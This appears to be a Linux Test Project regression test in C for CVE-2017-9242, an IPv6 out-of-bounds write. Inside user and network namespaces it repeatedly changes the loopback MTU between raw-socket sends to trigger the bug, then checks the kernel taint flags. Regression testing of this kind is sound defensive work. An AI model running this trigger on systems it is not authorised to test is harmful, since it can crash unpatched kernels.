// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (c) 2019 SUSE LLC <mdoucha@suse.cz>
 */

/*
 * CVE-2017-9242
 *
 * Check that send() doesn't cause kernel crash (TODO: better description)
 * Kernel crash fixed in:
 * 
 *  commit 232cd35d0804cc241eb887bb8d4d9b3b9881c64a (HEAD)
 *  Author: Eric Dumazet <edumazet@google.com>
 *  Date:   Fri May 19 14:17:48 2017 -0700
 *
 *  ipv6: fix out of bound writes in __ip6_append_data()
 */

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sched.h>

#include "tst_test.h"
#include "tst_net.h"
#include "tst_taint.h"

#define BUFSIZE 8200

static struct sockaddr_in6 addr;

static void setup(void)
{
	int real_uid = getuid();
	int real_gid = getgid();

	tst_taint_init(TST_TAINT_W | TST_TAINT_D);

	SAFE_UNSHARE(CLONE_NEWUSER);
	SAFE_UNSHARE(CLONE_NEWNET);
	SAFE_FILE_PRINTF("/proc/self/setgroups", "deny");
	SAFE_FILE_PRINTF("/proc/self/uid_map", "0 %d 1", real_uid);
	SAFE_FILE_PRINTF("/proc/self/gid_map", "0 %d 1", real_gid);

	tst_init_sockaddr_inet6_bin(&addr, &in6addr_loopback, 12345);
}

static void run(void)
{
	int sock, i;
	char buf[BUFSIZE];
	struct ifreq ifr;

	memset(buf, 0x42, BUFSIZE);
	sock = SAFE_SOCKET(AF_INET6, SOCK_RAW, IPPROTO_UDP);
	strcpy(ifr.ifr_name, "lo");
	ifr.ifr_flags = IFF_UP;
	SAFE_IOCTL(sock, SIOCSIFFLAGS, &ifr);
	SAFE_CLOSE(sock);

	for (i = 0; i < 1000; i++) {
		sock = SAFE_SOCKET(AF_INET6, SOCK_RAW, IPPROTO_UDP);
		SAFE_SETSOCKOPT_INT(sock, IPPROTO_IP, IP_HDRINCL, 0);
		ifr.ifr_mtu = BUFSIZE;
		SAFE_IOCTL(sock, SIOCSIFMTU, &ifr);
		SAFE_CONNECT(sock, (struct sockaddr *)&addr, sizeof(addr));
		SAFE_SEND(1, sock, buf, BUFSIZE, MSG_MORE);
		ifr.ifr_mtu = 2000;
		SAFE_IOCTL(sock, SIOCSIFMTU, &ifr);
		SAFE_SEND(1, sock, buf, BUFSIZE, MSG_MORE);
		SAFE_SEND(1, sock, buf, BUFSIZE, 0);
		SAFE_CLOSE(sock);

		if (tst_taint_check()) {
			tst_res(TFAIL, "Kernel is vulnerable");
			return;
		}
	}

	tst_res(TPASS, "Nothing bad happened, probably");
}

static struct tst_test test = {
	.test_all = run,
	.setup = setup,
	.needs_kconfigs = (const char *[]) {
		"CONFIG_USER_NS=y",
		"CONFIG_NET_NS=y",
		NULL
	},
	.tags = (const struct tst_tag[]) {
		{"linux-git", "232cd35d0804"},
		{"CVE", "2017-9242"},
		{}
	}
};
